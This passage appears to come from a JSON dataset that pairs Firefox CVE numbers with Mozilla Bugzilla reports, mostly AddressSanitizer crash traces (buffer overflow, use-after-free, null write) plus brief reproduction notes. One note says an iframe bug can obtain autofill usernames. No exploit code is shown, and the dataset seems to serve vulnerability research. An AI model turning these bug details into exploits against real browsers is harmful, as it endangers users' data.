nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:413:33 #32 0x7fd2608752b5 in nsViewManager::ProcessPendingUpdates() /home/worker/workspace/build/src/view/nsViewManager.cpp:1095:5 #33 0x7fd260f735a8 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1985:11 #34 0x7fd260f7e973 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:300:7 #35 0x7fd260f7e644 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:322:5 #36 0x7fd260f80cfb in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:753:5 #37 0x7fd260f80cfb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:666 #38 0x7fd260f808a5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:567:9 #39 0x7fd2617a4542 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #40 0x7fd25ba765e9 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #41 0x7fd25b7349a4 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1630:28 #42 0x7fd25b68cf64 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2040:25 #43 0x7fd25b689df7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1975:17 #44 0x7fd25b68bb04 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1844:5 #45 0x7fd25b68c136 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1877:15 #46 0x7fd25a8ef8a0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14 #47 0x7fd25a8ec2e8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10 #48 0x7fd25b694f21 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #49 0x7fd25b5f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #50 0x7fd25b5f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #51 0x7fd25b5f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #52 0x7fd2608eda8f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #53 0x7fd264139fb7 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #54 0x7fd25b5f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #55 0x7fd25b5f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #56 0x7fd25b5f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #57 0x7fd264139ae5 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #58 0x4eb7a3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #59 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285 #60 0x7fd27633082f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #61 0x41d0f8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d0f8) 0x7fd26840d038 is located 0 bytes to the right of global variable 'vtable for SVGFEContainerFrame' defined in '/home/worker/workspace/build/src/obj-firefox/layout/svg/Unified_cpp_layout_svg0.cpp' (0x7fd26840cba0) of size 1176 SUMMARY: AddressSanitizer: global-buffer-overflow /home/worker/workspace/build/src/layout/svg/SVGGeometryFrame.cpp:701:52 in mozilla::SVGGeometryFrame::GetCanvasTM() Shadow bytes around the buggy address: 0x0ffacd0799b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd0799c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd0799d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd0799e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd0799f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0ffacd079a00: 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9 f9 0x0ffacd079a10: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 0x0ffacd079a20: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 0x0ffacd079a30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd079a40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffacd079a50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==28350==ABORTING [Parent 27963] WARNING: pipe error (57): Connection reset by peer: file /home/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 353 [Parent 27963] WARNING: pipe error (53): Connection reset by peer: file /home/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 353 ###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0081,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv ASAN:DEADLYSIGNAL ================================================================= ==28371==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f4597a8f767 bp 0x7f4593c62380 sp 0x7f4593c62370 T2) ==28371==The signal is caused by a WRITE memory access. ==28371==Hint: address points to the zero page. #0 0x7f4597a8f766 in mozilla::ipc::MessageChannel::OnChannelErrorFromLink() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2465:13 #1 0x7f4597a948b7 in OnChannelError /home/worker/workspace/build/src/ipc/glue/MessageLink.cpp:368:12 #2 0x7f4597a948b7 in non-virtual thunk to mozilla::ipc::ProcessLink::OnChannelError() /home/worker/workspace/build/src/ipc/glue/MessageLink.cpp:360 #3 0x7f4597a40c71 in event_persist_closure /home/worker/workspace/build/src/ipc/chromium/src/third_party/libevent/event.c:1580:9 #4 0x7f4597a40c71 in event_process_active_single_queue /home/worker/workspace/build/src/ipc/chromium/src/third_party/libevent/event.c:1639 #5 0x7f4597a383d9 in event_process_active /home/worker/workspace/build/src/ipc/chromium/src/third_party/libevent/event.c:1741:9 #6 0x7f4597a383d9 in event_base_loop /home/worker/workspace/build/src/ipc/chromium/src/third_party/libevent/event.c:1961 #7 0x7f45979f8acd in base::MessagePumpLibevent::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/chromium/src/base/message_pump_libevent.cc:373:7 #8 0x7f45979f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #9 0x7f45979f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #10 0x7f45979f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #11 0x7f4597a11e3f in base::Thread::ThreadMain() /home/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:179:16 #12 0x7f4597a0129c in ThreadFunc(void*) /home/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:38:13 #13 0x7f45b37846b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9) #14 0x7f45b280d82c in clone /build/glibc-9tT8Do/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109 AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2465:13 in mozilla::ipc::MessageChannel::OnChannelErrorFromLink() Thread T2 (Chrome_ChildThr) created by T0 (Web Content) here: #0 0x4a3d56 in __interceptor_pthread_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:245:3 #1 0x7f4597a001ec in CreateThread /home/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:139:14 #2 0x7f4597a001ec in PlatformThread::Create(unsigned long, PlatformThread::Delegate*, unsigned long*) /home/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:150 #3 0x7f4597a1187e in base::Thread::StartWithOptions(base::Thread::Options const&) /home/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:98:8 #4 0x7f4597a968d7 in mozilla::ipc::ProcessChild::ProcessChild(int) /home/worker/workspace/build/src/ipc/glue/ProcessChild.cpp:24:5 #5 0x7f45a0539a42 in ContentProcess /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/ContentProcess.h:31:7 #6 0x7f45a0539a42 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:654 #7 0x4eb7a3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #8 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285 #9 0x7f45b272782f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 ==28371==ABORTING"
      }
    ],
    "CVE-2017-7787": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1322896",
        "title": "(cross domain) Iframe breakes scope on location.reload",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36 Steps to reproduce: Please open ff-iframe-break-scope.zip in the attachment to reproduce the bug. I have a website (index.html). On that website i include Iframe 1 (iframe-1.html) with <iframe ...>. Also there is a link to reload the page with location.reload(). In Iframe 1 (iframe-1.html) there I create a new Iframe with document.createElement. In Iframe 2 (iframe-2.html) I create another new Iframe. I have a Iframe Element without src-attribute in the page. And after a timeout I Iframe-Element gets a Source. Iframe 3 only contains some HTML. --- Important: This bug also works with 3rd party (cross domain) Iframes. In online advertising this is not a unusal construction. In ff-get-username.zip I use this bug to get the autofill username from a page. Just start with step-1.html. Actual results: If I press the \"Click me\" link twice, the page doesn't reload. Instead the Content from the last Iframe ist shown. Expected results: The page should reload."
      }
    ],
    "CVE-2017-7791": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1365875",
        "title": "Firefox allows you to insert confirm/alert/prompt dialog in any domain",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Steps to reproduce: 1- Go to http://createcharts.esy.es/permission-prompt.html 2- Click button Tested in: Firefox Nightly 55.0a1 (2017-05-17) (64-bit) Firefox Developer Edition 54.0a2 (2017-04-18) (32-bits) Firefox 53.0.2 (32-bit) Actual results: Permission Prompt not correctly dismissed on top window navigation"
      }
    ],
    "CVE-2017-7792": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1368652",
        "title": "GetDefaultOIDFormat: buffer overflow caused by long OIDs",
        "description": "User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0 Build ID: 20170420084331 Steps to reproduce: View a cert with a really long OID. You can reproduce using attached file cp-bigoid.pem. Go to certificate import dialog, then \"View Cert\". Actual results: The GetDefaultOIDFormat printing function overflows the buffer, causing segfault. Expected results: The OID should have been printed properly. Or at the very least, Firefox should not have crashed :)"
      }
    ],
    "CVE-2017-7793": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1371889",
        "title": "Heap-use-after-free in mozilla::dom::(anonymous namespace)::ConsumeBodyDoneObserver<mozilla::dom::Request>::OnStreamComplete",
        "description": ">================================================================= >==107957==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d000066990 at pc 0x7f6f64bc192f bp 0x7ffcea9dbcf0 sp 0x7ffcea9dbce8 >READ of size 8 at 0x60d000066990 thread T0 (Web Content) > #0 0x7f6f64bc192e in mozilla::dom::(anonymous namespace)::ConsumeBodyDoneObserver<mozilla::dom::Request>::OnStreamComplete(nsIStreamLoader*, nsISupports*, nsresult, unsigned int, unsigned char const*) dom/fetch/Fetch.cpp:1006:21 > #1 0x7f6f613b41e7 in mozilla::net::nsStreamLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) netwerk/base/nsStreamLoader.cpp:105:30 > #2 0x7f6f6131fc95 in nsInputStreamPump::OnStateStop() netwerk/base/nsInputStreamPump.cpp:734:20 > #3 0x7f6f6131e44e in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/nsInputStreamPump.cpp:448:25 > #4 0x7f6f611532fd in nsInputStreamReadyEvent::Run() xpcom/io/nsStreamUtils.cpp:96:20 > #5 0x7f6f6119a898 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() xpcom/threads/ThrottledEventQueue.cpp:190:22 > #6 0x7f6f6119a47f in mozilla::ThrottledEventQueue::Inner::Executor::Run() xpcom/threads/ThrottledEventQueue.cpp:74:15 > #7 0x7f6f6119a898 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() xpcom/threads/ThrottledEventQueue.cpp:190:22 > #8 0x7f6f6119a47f in mozilla::ThrottledEventQueue::Inner::Executor::Run() xpcom/threads/ThrottledEventQueue.cpp:74:15 > #9 0x7f6f611827c8 in mozilla::SchedulerGroup::Runnable::Run() xpcom/threads/SchedulerGroup.cpp:359:25 > #10 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #11 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #12 0x7f6f61d66358 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:96:21 > #13 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #14 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #15 0x7f6f65f1b0fa in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:156:27 > #16 0x7f6f693d6aac in XRE_RunAppShell() toolkit/xre/nsEmbedFunctions.cpp:896:22 > #17 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #18 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #19 0x7f6f693d6598 in XRE_InitChildProcess(int, char**, XREChildData const*) toolkit/xre/nsEmbedFunctions.cpp:712:34 > #20 0x524fc1 in content_process_main browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 > #21 0x524fc1 in main browser/app/nsBrowserApp.cpp:286 > #22 0x7f6f79ee7f44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21f44) > #23 0x41d905 in _start (objdir-ff-asan/dist/bin/firefox-bin+0x41d905) > >0x60d000066990 is located 16 bytes inside of 144-byte region [0x60d000066980,0x60d000066a10) >freed by thread T104 (DOM Worker) here: > #0 0x4e8890 in __interceptor_free /build/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47 > #1 0x7f6f6108dd75 in SnowWhiteKiller::~SnowWhiteKiller() xpcom/base/nsCycleCollector.cpp:2651:25 > #2 0x7f6f6108d1f1 in nsCycleCollector::FreeSnowWhite(bool) xpcom/base/nsCycleCollector.cpp:2826:3 > #3 0x7f6f61093ee8 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3829:3 > #4 0x7f6f61093852 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) xpcom/base/nsCycleCollector.cpp:3650:9 > #5 0x7f6f61094f74 in ShutdownCollect xpcom/base/nsCycleCollector.cpp:3591:10 > #6 0x7f6f61094f74 in nsCycleCollector::Shutdown(bool) xpcom/base/nsCycleCollector.cpp:3886 > #7 0x7f6f61096b4c in nsCycleCollector_shutdown(bool) xpcom/base/nsCycleCollector.cpp:4247:23 > #8 0x7f6f65a486cb in (anonymous namespace)::WorkerJSContext::~WorkerJSContext() dom/workers/RuntimeService.cpp:1144:5 > #9 0x7f6f65a47f3a in (anonymous namespace)::WorkerThreadPrimaryRunnable::Run() dom/workers/RuntimeService.cpp:2952:3 > #10 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #11 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #12 0x7f6f61d67896 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:338:20 > #13 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #14 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #15 0x7f6f611a650f in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:501:11 > #16 0x7f6f775d222c in _pt_root nsprpub/pr/src/pthreads/ptthread.c:216:5 > #17 0x7f6f7aec2183 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x8183) > >previously allocated by thread T104 (DOM Worker) here: > #0 0x4e8be8 in malloc /build/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:66 > #1 0x52622d in moz_xmalloc memory/mozalloc/mozalloc.cpp:83:17 > #2 0x7f6f64b9c3d9 in operator new objdir-ff-asan/dist/include/mozilla/mozalloc.h:194:12 > #3 0x7f6f64b9c3d9 in mozilla::dom::Request::Constructor(mozilla::dom::GlobalObject const&, mozilla::dom::RequestOrUSVString const&, mozilla::dom::RequestInit const&, mozilla::ErrorResult&) dom/fetch/Request.cpp:581 > #4 0x7f6f63c1c7c6 in mozilla::dom::RequestBinding::_constructor(JSContext*, unsigned int, JS::Value*) objdir-ff-asan/dom/bindings/RequestBinding.cpp:1851:53 > #5 0x7f6f697c0069 in CallJSNative js/src/jscntxtinlines.h:293:15 > #6 0x7f6f697c0069 in CallJSNativeConstructor js/src/jscntxtinlines.h:326 > #7 0x7f6f697c0069 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) js/src/vm/Interpreter.cpp:573 > #8 0x7f6f697bfe2c in js::ConstructFromStack(JSContext*, JS::CallArgs const&) js/src/vm/Interpreter.cpp:599:12 > #9 0x7f6f6979b493 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:3056:18 > #10 0x7f6f697941bb in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:410:12 > #11 0x7f6f697c153a in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) js/src/vm/Interpreter.cpp:699:15 > #12 0x7f6f697c1ec1 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/vm/Interpreter.cpp:731:12 > #13 0x7f6f69efa8ea in Evaluate(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:4662:19 > #14 0x7f6f69efac60 in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:4727:12 > #15 0x7f6f65a537ee in (anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::workers::WorkerPrivate*) dom/workers/ScriptLoader.cpp:1969:10 > #16 0x7f6f65ae4ad1 in mozilla::dom::workers::WorkerRunnable::Run() dom/workers/WorkerRunnable.cpp:374:12 > #17 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #18 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #19 0x7f6f65ad11b3 in mozilla::dom::workers::WorkerPrivate::RunCurrentSyncLoop() dom/workers/WorkerPrivate.cpp:5874:7 > #20 0x7f6f65a16e51 in (anonymous namespace)::LoadAllScripts(mozilla::dom::workers::WorkerPrivate*, nsTArray<(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::workers::WorkerScriptType, mozilla::ErrorResult&) dom/workers/ScriptLoader.cpp:2127:12 > #21 0x7f6f65a169b0 in mozilla::dom::workers::scriptloader::LoadMainScript(mozilla::dom::workers::WorkerPrivate*, nsAString const&, mozilla::dom::workers::WorkerScriptType, mozilla::ErrorResult&) dom/workers/ScriptLoader.cpp:2245:3 > #22 0x7f6f65af35bb in (anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::workers::WorkerPrivate*) dom/workers/WorkerPrivate.cpp:586:5 > #23 0x7f6f65ae4ad1 in mozilla::dom::workers::WorkerRunnable::Run() dom/workers/WorkerRunnable.cpp:374:12 > #24 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #25 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #26 0x7f6f65acb4fb in mozilla::dom::workers::WorkerPrivate::DoRunLoop(JSContext*) dom/workers/WorkerPrivate.cpp:5115:7 > #27 0x7f6f65a47ebb in (anonymous namespace)::WorkerThreadPrimaryRunnable::Run() dom/workers/RuntimeService.cpp:2919:25 > #28 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #29 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #30 0x7f6f61d67896 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:338:20 > #31 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #32 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #33 0x7f6f611a650f in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:501:11 > >Thread T104 (DOM Worker) created by T0 (Web Content) here: > #0 0x4362cd in __interceptor_pthread_create /build/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:314 > #1 0x7f6f775cee35 in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:457:14 > #2 0x7f6f775cea2e in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:548:12 > #3 0x7f6f611a83d1 in nsThread::Init(nsACString const&) xpcom/threads/nsThread.cpp:683:8 > #4 0x7f6f65aeeecb in mozilla::dom::workers::WorkerThread::Create(mozilla::dom::workers::WorkerThreadFriendKey const&) dom/workers/WorkerThread.cpp:90:7 > #5 0x7f6f65a0edc1 in mozilla::dom::workers::RuntimeService::ScheduleWorker(mozilla::dom::workers::WorkerPrivate*) dom/workers/RuntimeService.cpp:1918:14 > #6 0x7f6f65a0d298 in mozilla::dom::workers::RuntimeService::RegisterWorker(mozilla::dom::workers::WorkerPrivate*) dom/workers/RuntimeService.cpp:1745:19 > #7 0x7f6f65ac8533 in mozilla::dom::workers::WorkerPrivate::Constructor(JSContext*, nsAString const&, bool, mozilla::dom::WorkerType, nsAString const&, nsACString const&, mozilla::dom::workers::WorkerLoadInfo*, mozilla::ErrorResult&) dom/workers/WorkerPrivate.cpp:4657:24 > #8 0x7f6f65ac7e1d in mozilla::dom::workers::WorkerPrivate::Constructor(mozilla::dom::GlobalObject const&, nsAString const&, bool, mozilla::dom::WorkerType, nsAString const&, mozilla::dom::workers::WorkerLoadInfo*, mozilla::ErrorResult&) dom/workers/WorkerPrivate.cpp:4574:10 > #9 0x7f6f65ac7daf in mozilla::dom::workers::WorkerPrivate::Constructor(mozilla::dom::GlobalObject const&, nsAString const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) dom/workers/WorkerPrivate.cpp:4515:10 > #10 0x7f6f642848bf in mozilla::dom::WorkerBinding::_constructor(JSContext*, unsigned int, JS::Value*) objdir-ff-asan/dom/bindings/WorkerBinding.cpp:971:68 > #11 0x7f6f697c0069 in CallJSNative js/src/jscntxtinlines.h:293:15 > #12 0x7f6f697c0069 in CallJSNativeConstructor js/src/jscntxtinlines.h:326 > #13 0x7f6f697c0069 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) js/src/vm/Interpreter.cpp:573 > #14 0x7f6f697bfe2c in js::ConstructFromStack(JSContext*, JS::CallArgs const&) js/src/vm/Interpreter.cpp:599:12 > #15 0x7f6f6979b493 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:3056:18 > #16 0x7f6f697941bb in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:410:12 > #17 0x7f6f697c153a in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) js/src/vm/Interpreter.cpp:699:15 > #18 0x7f6f697c1ec1 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/vm/Interpreter.cpp:731:12 > #19 0x7f6f69ef98ee in ExecuteScript(JSContext*, JS::AutoObjectVector&, JS::Handle<JSScript*>, JS::Value*) js/src/jsapi.cpp:4578:12 > #20 0x7f6f69ef95c4 in JS_ExecuteScript(JSContext*, JS::AutoObjectVector&, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:4599:12 > #21 0x7f6f63547b68 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) dom/base/nsJSUtils.cpp:267:8 > #22 0x7f6f65e2fd93 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) dom/script/ScriptLoader.cpp:2129:25 > #23 0x7f6f65e2d254 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) dom/script/ScriptLoader.cpp:1725:10 > #24 0x7f6f65e1bf5b in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) dom/script/ScriptLoader.cpp:1427:10 > #25 0x7f6f65e19a3c in mozilla::dom::ScriptElement::MaybeProcessScript() dom/script/ScriptElement.cpp:149:18 > #26 0x7f6f6289453d in nsIScriptElement::AttemptToExecute() objdir-ff-asan/dist/include/nsIScriptElement.h:225:18 > #27 0x7f6f62893b13 in nsHtml5TreeOpExecutor::RunScript(nsIContent*) parser/html/nsHtml5TreeOpExecutor.cpp:698:22 > #28 0x7f6f6288f693 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:499:7 > #29 0x7f6f62897265 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:129:20 > #30 0x7f6f611827c8 in mozilla::SchedulerGroup::Runnable::Run() xpcom/threads/SchedulerGroup.cpp:359:25 > #31 0x7f6f611ad373 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:1406:14 > #32 0x7f6f611b7278 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/threads/nsThreadUtils.cpp:472:10 > #33 0x7f6f61d66358 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:96:21 > #34 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #35 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #36 0x7f6f65f1b0fa in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:156:27 > #37 0x7f6f693d6aac in XRE_RunAppShell() toolkit/xre/nsEmbedFunctions.cpp:896:22 > #38 0x7f6f61ccd9ed in RunHandler ipc/chromium/src/base/message_loop.cc:231:3 > #39 0x7f6f61ccd9ed in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:211 > #40 